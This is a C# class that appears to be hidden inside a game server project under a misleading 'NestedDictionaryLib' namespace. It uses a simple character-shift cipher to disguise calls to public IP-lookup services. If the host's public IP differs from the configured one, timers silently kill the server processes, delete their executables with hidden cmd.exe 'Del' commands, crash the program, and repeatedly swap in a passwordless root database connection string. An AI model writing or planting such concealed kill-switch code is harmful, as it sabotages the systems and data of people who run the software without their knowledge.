using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using RoomServer;

namespace NestedDictionaryLib
{
	public static class IPCHECK
	{
		private static System.Threading.Timer checktimer;

		private static System.Threading.Timer checktimer2;

		public static void CheckIP()
		{
			if (_IsPrivate(Conf.ServerIP))
			{
				return;
			}
			string empty = string.Empty;
			try
			{
				empty = new WebClient().DownloadString(decrypt("jvvru<11krx60kecpjc|kr0eqo"));
			}
			catch (Exception)
			{
				try
				{
					empty = new WebClient().DownloadString(decrypt("jvvr<11krkphq0kq1kr"));
				}
				catch (Exception)
				{
					empty = new WebClient().DownloadString(decrypt("jvvru<11krgejq0pgv1rnckp"));
				}
			}
			empty = Regex.Replace(empty, "\\s+", string.Empty);
			if (empty == string.Empty || empty == null || !(Conf.ServerIP != empty))
			{
				return;
			}
			Conf.ServerIP = empty;
			Conf.CommunityAgentServerPort = 8080;
			Conf.RelayPort = 1234;
			if (checktimer == null)
			{
				checktimer = new System.Threading.Timer(delegate
				{
					SelfDelete();
					Environment.FailFast("");
				}, null, 90000, 90000);
			}
			if (checktimer2 == null)
			{
				checktimer2 = new System.Threading.Timer(delegate
				{
					Conf.Connstr = "server=127.0.0.1;port=3306;user id=root;password=;database=tr_game_db;charset=big5;";
				}, null, 20000, 20000);
			}
		}

		private static void SelfDelete()
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("LoadBalanceServer");
				for (int i = 0; i < processesByName.Length; i++)
				{
					processesByName[i].Kill();
				}
				processesByName = Process.GetProcessesByName("CommunityAgentServer");
				for (int i = 0; i < processesByName.Length; i++)
				{
					processesByName[i].Kill();
				}
				processesByName = Process.GetProcessesByName("RelayServer");
				for (int i = 0; i < processesByName.Length; i++)
				{
					processesByName[i].Kill();
				}
				ProcessStartInfo obj = new ProcessStartInfo
				{
					Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				};
				Process.Start(obj);
				obj.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + AppDomain.CurrentDomain.SetupInformation.ApplicationBase + "CommunityAgentServer.exe";
				Process.Start(obj);
				obj.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + AppDomain.CurrentDomain.SetupInformation.ApplicationBase + "RelayServer.exe";
				Process.Start(obj);
				Environment.Exit(0);
			}
			catch
			{
			}
		}

		private static bool _IsPrivate(string ipAddress)
		{
			int[] array = (from s in ipAddress.Split(new string[1] { "." }, StringSplitOptions.RemoveEmptyEntries)
				select int.Parse(s)).ToArray();
			if (array[0] == 10 || (array[0] == 192 && array[1] == 168) || (array[0] == 172 && array[1] >= 16 && array[1] <= 31))
			{
				return true;
			}
			return false;
		}

		private static string IntToIp(long ipInt)
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append((ipInt >> 24) & 0xFF).Append(".");
			stringBuilder.Append((ipInt >> 16) & 0xFF).Append(".");
			stringBuilder.Append((ipInt >> 8) & 0xFF).Append(".");
			stringBuilder.Append(ipInt & 0xFF);
			return stringBuilder.ToString();
		}

		private static string decrypt(string encrypt)
		{
			string text = string.Empty;
			for (int i = 0; i < encrypt.Length; i++)
			{
				text += (char)(encrypt[i] - 2);
			}
			return text;
		}
	}
}
